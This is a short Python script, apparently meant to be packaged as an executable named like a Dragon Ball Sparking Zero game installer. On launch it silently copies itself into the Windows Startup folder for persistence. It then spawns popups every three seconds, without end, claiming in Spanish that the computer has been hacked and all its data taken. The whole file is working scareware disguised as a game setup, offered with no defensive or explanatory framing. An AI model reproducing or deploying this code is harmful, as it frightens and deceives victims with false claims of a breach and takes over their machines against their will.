"""
import ctypes
import time
import shutil
import os
import threading

def mostrar_ventana():
    ctypes.windll.user32.MessageBoxW(0, "Tu computadora ha sido hackeada y tenemos toda tu informacion.", "Alerta", 0x40 | 0x1)

def spam_ventanas():
    while True:
        threading.Thread(target=mostrar_ventana).start()
        time.sleep(3)  

def copiar_a_startup():
    try:
        nombre_archivo = "DragonBallSparkingZeroElamigosSetup.exe"
        ruta_origen = os.path.abspath(nombre_archivo)
        ruta_destino = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup", nombre_archivo)

        if not os.path.exists(ruta_destino):
            shutil.copyfile(ruta_origen, ruta_destino)
    except Exception:
        pass

if __name__ == "__main__":
    copiar_a_startup()
    spam_ventanas()
"""
